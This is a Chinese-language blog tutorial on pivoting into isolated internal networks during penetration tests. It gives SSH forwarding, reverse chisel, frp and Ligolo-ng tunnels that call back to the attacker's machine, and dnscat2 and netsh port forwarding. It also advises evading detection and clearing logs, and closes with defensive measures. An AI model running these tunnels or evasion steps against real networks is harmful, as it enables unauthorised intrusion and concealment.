---
title: 内网隧道与代理：突破网络隔离的关键技术
slug: kali内网隧道与代理-e5f6g
date: 2026-08-30
visibility: public
tags: Kali Linux, 内网隧道, 代理, 端口转发, 渗透测试, 教程
---

# 内网隧道与代理：突破网络隔离的关键技术

> 企业内网普遍通过 NAT、防火墙 ACL、边界路由、主机防火墙、域网络隔离形成多层防护，默认禁止公网主动访问内网资产，同时限制内网主机高危出站。内网隧道穿透（代理/端口转发）就是突破这些边界隔离、实现外网落地、内网横向漫游的底层技术。

## 一、为什么需要隧道

```
攻击机（公网） ——X 无法直连—— 内网主机（10.10.x.x）
                     防火墙/NAT 隔离

拿到一台边界机后：
攻击机 → 边界机（被控） → 通过隧道 → 内网主机
```

隧道把内网流量"包裹"在合法协议里（HTTP/HTTPS/DNS/ICMP/SSH），从而穿透防火墙。

## 二、隧道类型

| 类型 | 协议 | 特点 | 工具 |
|------|------|------|------|
| 正向隧道 | 从内向外主动连接 | 简单，需要出网 | chisel、frp、SSH |
| 反向隧道 | 从外向内回连 | 更隐蔽 | chisel --reverse、frp |
| DNS 隧道 | DNS 查询封装 | 隐蔽但慢 | dnscat2、iodine |
| ICMP 隧道 | ICMP ping | 隐蔽 | ptunnel |
| HTTP/HTTPS 隧道 | Web 协议 | 通用 | 各种 |

## 三、常见隧道工具

### 1. SSH 隧道（最基础）

```bash
# 本地端口转发：攻击机 8080 → 内网 10.0.0.5:80
ssh -L 8080:10.0.0.5:80 user@边界机

# 远程端口转发：边界机 9999 → 攻击机 22（实现反向）
ssh -R 9999:localhost:22 user@攻击机

# 动态端口转发（SOCKS5 代理）
ssh -D 1080 user@边界机
```

### 2. Chisel（HTTP 隧道，红队常用）

```bash
# 攻击机（server）
chisel server --port 8080 --reverse

# 边界机（client）
chisel client 攻击机IP:8080 R:1080:socks

# 之后可用 proxychains 通过本地 1080 访问内网
proxychains nmap -sT -Pn 10.0.0.5
```

### 3. frp（功能全面）

```bash
# 服务端（攻击机） frps.ini
[common]
bind_port = 7000

# 客户端（边界机） frpc.ini
[common]
server_addr = 攻击机IP
server_port = 7000

[socks]
type = tcp
remote_port = 1080
plugin = socks5
```

### 4. Ligolo-ng（新一代隧道）

```bash
# 代理（攻击机）
./proxy -selfcert
# agent（目标机）
./agent -connect 攻击机IP:11601
# 然后在代理端选择会话、添加路由
session
start
```

### 5. DNS 隧道

```bash
# 服务端
dnscat2
# 客户端
dnscat2 --host 8.8.8.8 --port 53
# 建立后，在客户端进入 shell
```

## 三、代理链（Proxy Chain）组合

### proxychains

```bash
# 修改配置 /etc/proxychains4.conf
# 添加代理
socks5 127.0.0.1 1080

# 使用
proxychains -q nmap -s -Pn 10.0.0.5
proxychains -q ssh root@10.0.0.5
proxychains -q sqlmap -u http://10.0.0.5/xxx --batch
```

### 多层代理（SOCKS 级联）

```
攻击机 → socks5(1080) → 边界机 → socks5(1081) → 内网2 → ...
proxychains 支持多条 socks 链（dynamic_chain 模式）
```

## 五、端口转发 vs 隧道

| 场景 | 技术 | 工具 |
|------|------|------|
| 访问内网单个端口 | 端口转发 | ssh -L / Meterpreter portfwd |
| 访问内网多端口/多主机 | 动态代理 | chisel socks / frp |
| 隐蔽传输 | DNS/ICMP 隧道 | dnscat2 / ptunnel |
| Windows 环境 | 端口转发 | netsh 端口转发 |

### Windows 端口转发（netsh）

```cmd
netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.0.0.5
```

## 五、绕过检测的注意事项

- 优先选择白名单协议（HTTP/HTTPS/SSH/DNS）
- 用 VPS 当跳板，避免直接暴露 IP
- 动态端口、随机时序
- 日志会留下痕迹，做好清理

## 六、防御视角：如何阻断隧道

1. 限制出站（默认仅允许 80/443/DNS）
2. 禁用 ICMP/DNS 隧道、限制 DNS 查询域名
3. 安全组/NGFW 规则收紧
4. 对异常 DNS 查询告警
5. 网络分段，最小权限

## 安全提醒

> 隧道是真实攻击者横向移动的基础能力，仅在授权内网渗透/红队演练中使用。企业侧应通过出站限制与监控来降低风险。

## 小结

- 隧道 = 把内网流量包装进合法协议，绕过网络隔离
- SSH 隧道基础、Chisel/frp 实战高效、DNS/ICMP 隐蔽
- proxychains 让整个工具链都能走代理
- 防御：限制出站、禁止 DNS 隧道、监控异常

> 下一篇：中间人攻击与流量嗅探——局域网内的控制与窃听。